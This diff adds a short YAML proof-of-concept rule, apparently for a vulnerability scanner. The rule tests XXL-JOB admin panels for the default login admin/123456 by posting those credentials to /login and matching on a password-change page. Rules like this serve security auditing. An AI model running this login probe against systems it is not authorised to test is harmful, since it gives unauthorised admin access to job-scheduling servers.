@@ -1,0 +1,14 @@
+name: poc-yaml-XXLJOB-admin-default-passwd
+description: >-
+  登录方式:admin/123456
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /login
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "userName=admin&password=123456"
+    expression:
+      status: 200
+      body_all: ["修改密码"]
